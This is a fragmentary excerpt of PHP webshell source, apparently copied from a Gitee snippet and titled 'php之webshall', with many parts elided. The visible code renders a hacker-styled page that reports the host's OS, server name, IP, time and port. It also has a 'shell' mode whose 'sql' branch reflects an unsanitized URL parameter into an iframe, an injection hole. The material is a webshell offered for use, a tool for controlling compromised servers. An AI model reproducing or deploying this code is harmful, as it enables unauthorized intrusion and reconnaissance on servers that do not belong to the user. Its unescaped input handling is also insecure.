```php
原贴地址(在码云):https://git.oschina.net/nero_xeizi/codes/1hgs0n8pfmbe5uawlrxkc
...
?>
<html>
<title>php之webshall</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8";>
<STYLE type="text/css">
    body {font-family: "sans-serif", "serif"; font-size: 12px;background-color: #000;color:green;}
    ...
    input {font-family: "sans-serif", "serif";font-size: 12px;}
     td {font-family: "sans-serif", "Verdana"; font-size: 12px; color:green;}
...
<table width="100%"  cellspacing="1" cellpadding="3">
    <tr>
        <td class="title" align="center">你的痛你不懂</td>
    </tr>
</table>
<hr>
<table width="100%"  cellspacing="1" cellpadding="3">
    <tr>
        <td>
            操作系统：
            <?php //php服务器变量
            echo PHP_OS;?></td><td>服务器名称：<?php echo $_SERVER['SERVER_NAME'];?><td>Server IP:<?php echo gethostbyname($_SERVER['SERVER_NAME']);?></tr><tr></td><td>Server time:<?php echo date("Y年m月d日 h:i:s",time());?></td><td>Server port :<?php echo $_SERVER['SERVER_PORT'];
            ?>
        </td></tr>
</table>
<hr>
...
elseif ($_GET['shell']=="sql"){
    ...
    if(!empty($_GET['url']))
    {
        echo '<iframe src='.$_GET['url'].' style="width:100%;height:200px;text-color:green"></iframe>';
